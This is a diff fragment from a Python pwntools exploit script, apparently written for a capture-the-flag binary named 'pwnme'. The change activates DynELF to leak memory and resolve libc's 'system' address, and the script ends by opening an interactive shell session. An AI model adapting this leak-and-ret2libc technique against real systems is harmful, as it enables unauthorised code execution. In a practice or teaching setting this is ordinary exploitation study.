@@ -20,8 +20,8 @@ def leak(addr):
 	return data
 # print hex(ret_addr(0x4010f9))
 # main = 0x400D96
-# d = DynELF(leak, main)
-# system_addr = d.lookup('system','libc')
-
+d = DynELF(leak, elf=ELF('./pwnme'))
+system_addr = d.lookup('system','libc')
+# leak(0x400D96)
 print hex(system)
 p.interactive()
